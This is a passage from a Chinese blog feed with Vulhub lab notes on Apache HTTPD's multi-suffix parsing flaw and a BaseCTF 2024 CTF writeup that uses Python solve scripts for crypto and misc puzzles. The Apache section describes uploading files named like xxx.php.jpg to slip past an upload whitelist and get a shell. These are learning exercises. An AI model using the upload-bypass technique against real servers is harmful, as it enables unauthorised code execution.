class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><blockquote><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre class="line-numbers language-none"><code class="language-none">AddType text/html .htmlAddLanguage zh-CN .cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler application/x-httpd-php .php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p></blockquote><h2 id="漏洞复现-71"><a href="#漏洞复现-71" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/147.jpg" alt="147"></p><h1 id="Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑"><a href="#Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑" class="headerlink" title="Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)"></a>Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)</h1><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。</p><p>参考链接：</p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a></li><li><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></li></ul></blockquote><h2 id="漏洞复现-72"><a href="#漏洞复现-72" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>HTTP余下的漏洞应该都试不了了 镜像pull老失败….</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><blockquote><p>We are just another visitor in a transient world.</p></blockquote><p>原文大部分内容来自<a href="https://github.com/vulhub/vulhub">vulhub</a>中自带的readme文件 在此非常感谢铺下前路的技术大牛</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一脚踹开src的大门&quot;&gt;&lt;a href=&quot;#一脚踹开src的大门&quot; class=&quot;headerlink&quot; title=&quot;一脚踹开src的大门&quot;&gt;&lt;/a&gt;一脚踹开src的大门&lt;/h2&gt;&lt;p&gt;嘛 机缘巧合下开始练习src 总之先拿vulhub练练手&lt;br&gt;注释: 本来用的是docker纯本地搭建 效率太鸡肋了 换成在线网站搞flag的形式吧 没法getshell的会在这里继续更新&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/src/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="src" scheme="https://www.maonie.top/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>神奇脚本在哪里-CTF之Pwn</title>
    <link href="https://www.maonie.top/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/"/>
    <id>https://www.maonie.top/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/</id>
    <published>2024-08-25T19:52:17.000Z</published>
    <updated>2024-09-08T11:46:38.656Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>ps:最近刚开学 很忙 会很慢的更</p><h2 id="最近接触到了Pwn-那就来顺带讲讲Pwn吧"><a href="#最近接触到了Pwn-那就来顺带讲讲Pwn吧" class="headerlink" title="最近接触到了Pwn 那就来顺带讲讲Pwn吧"></a>最近接触到了Pwn 那就来顺带讲讲Pwn吧</h2><p>基于我对pwn的理解 pwn的过程分别为下:<br>1.题目在大部分情况下会提供一个文件和相应环境<br>2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件<br>3.尝试通过nc 或python的pwn脚本来爆破出flag内容</p><span id="more"></span><h2 id="（在做了的）例题"><a href="#（在做了的）例题" class="headerlink" title="（在做了的）例题"></a>（在做了的）例题</h2><h2 id="BUUCTF-test-your-nc"><a href="#BUUCTF-test-your-nc" class="headerlink" title="[BUUCTF]test-your-nc"></a>[BUUCTF]test-your-nc</h2><p>这个题目标题就已经揭示了大部分的主要内容-用nc链接靶机i/p获取flag</p><p><img data-src="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/1.jpg" alt="1"></p><p><img data-src="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/2.jpg" alt="2"></p><h2 id="后面的等我持续更新中（逃"><a href="#后面的等我持续更新中（逃" class="headerlink" title="后面的等我持续更新中（逃"></a>后面的等我持续更新中（逃</h2><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;ps:最近刚开学 很忙 会很慢的更&lt;/p&gt;
&lt;h2 id=&quot;最近接触到了Pwn-那就来顺带讲讲Pwn吧&quot;&gt;&lt;a href=&quot;#最近接触到了Pwn-那就来顺带讲讲Pwn吧&quot; class=&quot;headerlink&quot; title=&quot;最近接触到了Pwn 那就来顺带讲讲Pwn吧&quot;&gt;&lt;/a&gt;最近接触到了Pwn 那就来顺带讲讲Pwn吧&lt;/h2&gt;&lt;p&gt;基于我对pwn的理解 pwn的过程分别为下:&lt;br&gt;1.题目在大部分情况下会提供一个文件和相应环境&lt;br&gt;2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件&lt;br&gt;3.尝试通过nc 或python的pwn脚本来爆破出flag内容&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BaseCTF高校联合新生赛2024</title>
    <link href="https://www.maonie.top/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/"/>
    <id>https://www.maonie.top/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/</id>
    <published>2024-08-15T23:12:08.000Z</published>
    <updated>2024-08-30T20:05:25.226Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>已经收到Kengwang的礼物啦<br><del>鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了</del><br>目前更新到了第一周的writeup</p><span id="more"></span><h1 id="第一周-我们的writeup"><a href="#第一周-我们的writeup" class="headerlink" title="第一周-我们的writeup"></a>第一周-我们的writeup</h1><p><strong>这里是队伍0penness在BaseCTF 高校联合新生赛中对于题目的相关解答&amp;writeup</strong><br>爱来自<a href="https://www.maonie.top/">猫涅</a>&amp;<a href="https://truthleader.github.io/">真理教教主</a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/2.jpg" alt="2"><br>解压之后得到了一张图和压缩包<br>压缩包有密码保护 那么密码铁定就在这张图里边<br>放入stegsolve 解析图片<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/3.jpg" alt="3">一眼base加密 拿去解码<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/4.jpg" alt="4"><br>结果是个小提示 说明该图片经过了LSB加密<br>解密后翻到最上边确实有隐藏信息<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/5.jpg" alt="5"><br>用这段key打开压缩包<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/6.jpg" alt="6"><br>里面照样藏了个加密的压缩包 密码爆破也没用处 直接提示错误<br>根据压缩包的名称我们可以猜测这是一个伪加密zip<br>将他放进010editor 更改他的属性 解除伪加密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/1.png" alt="1"><br>然后解压就是了 是个txt 还是一眼base加密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/7.jpg" alt="7"><br>这是初步的结果 把前面的干扰项flag删除 继续解密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/8.jpg" alt="8"><br>flag get<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/9.jpg" alt="9"></p><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><p>网站进不去怎么办涅<br>nslookup一下网站dns记录吧<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/19.jpg" alt="19"><br>结束了</p><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><p>wireshark解包题 总之ctrl+f 字符串 flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/16.jpg" alt="16"><br>有一个flag.jpg 和 flag.php 都追踪tcp流之后发现藏在php的里边<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/17.jpg" alt="17"><br>flag字段明显是反转过的 去找网站转回来<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/18.jpg" alt="18"><br>完事</p><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><p>把文件放进了ida pro 没什么好注意的点 除了hex编码下有一些倒转的flag.txt<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/22.jpg" alt="22"><br>难道是要将整个文件的某种编码进行反转？<br>这里就搜到一个正好能用的小工具<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/23.jpg" alt="23"><br>放进去转了一下 出来个inversion.bin<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/24.jpg" alt="24"><br>表面是张jpg 但hex码中有flag.txt的字眼 经过判断 这是个经过binwalk组合的文件<br>进自带binwalk的kali 把他拆成两半 获得flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/25.jpg" alt="25"></p><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><p>打开一看 一眼base加密</p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/20.jpg" alt="20"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/21.jpg" alt="21"><br>获取</p><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p><pre class="line-numbers language-none"><code class="language-none">import hashlib  import itertools    # 给定的flag模板和哈希值  flag_template = 'BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}'  target_hash = 'e40075055f34f88993f47efb3429bd0e44a7f479'    # 可能的字符集（这里假设是小写字母和数字）  charset = 'QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789'    # 遍历所有可能的两个字符组合  for chars in itertools.product(charset, charset):      # 生成当前尝试的flag      current_flag = flag_template.replace('??', ''.join(chars))      # 计算当前flag的SHA-1哈希值      current_hash = hashlib.sha1(current_flag.encode()).hexdigest()      # 检查哈希值是否匹配      print(current_hash)    if current_hash == target_hash:          print(f"找到匹配的flag: {current_flag}")          break  # 找到匹配项后退出循环  else:      print("没有找到匹配的flag")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-捂住X只耳"><a href="#Week1-捂住X只耳" class="headerlink" title="[Week1] 捂住X只耳"></a>[Week1] 捂住X只耳</h2><p>给了段音乐 提示为“屏蔽立体音，发现隐藏的东西”<br>我是在用potplayer尝试用不同音轨输出时发现的<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/10.jpg" alt="10"><br>将中置声音完全屏蔽 增大其他轨道的音量 仔细听会有五段规律相同的摩斯密码<br>那时候有点太兴奋了忘了记录过程 总之录屏下来放进了pr 用音轨可视化得出了摩斯密码<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/11.png" alt="11"></p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/12.jpg" alt="12"></p><h2 id="Week1-倒计时？海报！（包括公开版和公开前）"><a href="#Week1-倒计时？海报！（包括公开版和公开前）" class="headerlink" title="[Week1] 倒计时？海报！（包括公开版和公开前）"></a>[Week1] 倒计时？海报！（包括公开版和公开前）</h2><p>群相册里有十张倒计时的图片 每一张都藏着一部分flag<br>鉴于已经公开了flag 我这里列出部分过程截图<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/13.jpg" alt="13"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/14.jpg" alt="14"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/15.jpg" alt="15"></p><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a><strong>[Week1] 签到！DK 盾！</strong></h2><p>这个就没啥好说的了</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h2><p>题目给了n e c 还有not_phi=(p+2)<em>(q+2)=p<code>*</code>q+2p+2q+4<br>要算出私钥d就要算出n的欧拉函数<br>n的欧拉函数是(p-1)</em>(q-1)=p<code>*</code>q-p-q+1</p><p>n = p<code>*</code>q<br>所以这是初中生就能解决的因式问题</p><p>n的欧拉函数 = (not_phi-n-4)//2</p><p>得到欧拉函数就可以用模逆元算d</p><p>有c d n就有明文</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import libnumfrom sympy import mod_inverse  e=65537c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421pplusq=(not_phi-n-4)//2phi=n+1-pplusqd = mod_inverse(e, phi)m=pow(c,d,n)print(libnum.n2s(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-babypack"><a href="#Week1-babypack" class="headerlink" title="[Week1] babypack"></a>[Week1] babypack</h2><p>加密脚本的过程大概是</p><ol><li>把flag转换为2进制</li><li>创建一个随机数列表a,可以观察到每个随机数必然是后一个的两倍多一点</li><li>然后看flag的2进制中的每一位是不是1,如果是则将随机数列表里对应数加到变量c上</li></ol><p>我们有的是a和c<br>那么就可以让a[i]和c比大小,判断第i+1位是不是1</p><p>总之exp如下</p><pre class="line-numbers language-none"><code class="language-none"># a = ···# c = ···for i in a:    if c&gt;i:        c-=i        print(1,end='')    else:        print(0,end='')    flag=0b10000100110000101110011011001010100001101010100010001100111101100110010011000110011010001100010001100000110001100110001001101010010110100110011011000100110010101100101001011010011010001100101001101000110000100101101011000100110010100110110011001010010110100110000011001100011001000110001011001010011010000110100011000100110010000110100011000110011100101111100print(libnum.n2s(flag))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h2><p>rsa算法,但是没有p和q,直接取n<br>我猜n大概率是素数,所以直接算它的欧拉函数</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import libnumfrom sympy import mod_inverse  n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323e = 65537c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832phi = n-1d = mod_inverse(e, phi)m = pow(c,d,n)print(libnum.n2s(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a><strong>[Week1] 十七倍</strong></h2><p>明文m转秘文c的算式为<br>m*17%256=c</p><p>那么 m=c*17关于256的模逆元%256<br>可以很容易的知道是241</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">cipher = [         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,        180, 113, 146, 148, 163,  79,  78,  48, 231,  77] for int in cipher:    print(chr(int),end='')    print()for i in range(len(cipher)):    cipher[i] = (cipher[i]*241) % 256for int in cipher:    print(chr(int),end='')  # 或者，如果你不想使用预定义的逆元  # x = solve_modular_equation(y, multiplier=17, modulus=256)  # print(f"x = {x}")  # 同样应该输出 x = 148<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a><strong>[Week1] helloCrypto</strong></h2><p>很简单的一道<br>aes是对称加密,即然key给了就能直接解</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from Crypto.Util.number import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import padimport randomimport libnumkey = libnum.n2s(208797759953288399620324890930572736628)my_aes=AES.new(key=key,mode=AES.MODE_ECB)c = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'decrypted_padded = my_aes.decrypt(c)  print(decrypted_padded)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a><strong>[Week1] 你会算md5吗</strong></h2><p>题目的加密过程,是将flag里的每一个字符都单独拎出来算一遍md5<br>那么只要把ascii表上的字符都算一遍做成字典,然后和密文撞就行了</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">import hashlib  import string    def build_md5_dict():      md5_dict = {}      characters = string.ascii_letters + string.digits + string.punctuation      for char in characters:          md5_hash = hashlib.md5(char.encode()).hexdigest()          md5_dict[md5_hash] = char      return md5_dict    # 构建并打印MD5字典（注意：这里只打印了一部分以节省空间）  md5_dict = build_md5_dict()    # 注意：由于MD5的哈希冲突可能性极低（但不为0），我们假设在这个小字符集中没有冲突。def recover_string_from_md5_list(md5_list, md5_dict):      recovered_string = ""      for md5_hash in md5_list:          if md5_hash in md5_dict:              recovered_string += md5_dict[md5_hash]          else:              # 如果MD5列表中包含未知的MD5值，可以选择跳过或抛出异常              recovered_string += "?"      return recovered_string    # 示例MD5列表  md5_list = ['9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf']  # 使用步骤1中生成的md5_dict来恢复字符串  recovered_string = recover_string_from_md5_list(md5_list, md5_dict)  print(recovered_string)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a><strong>[Week1] HTTP 是什么呀</strong></h2><p>满足题目所有要求<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_2.png" alt="text"> </p><p>就能在网络包里发现flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_1_3.png" alt="text"> </p><h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•`"></a>[Week1] 喵喵喵´•ﻌ•`</h2><p>easy<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_2.png" alt="alt text"></p><h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>md5函数不能接受数组<br>会返回false<br>弱比较和强比较都能绕<br><img 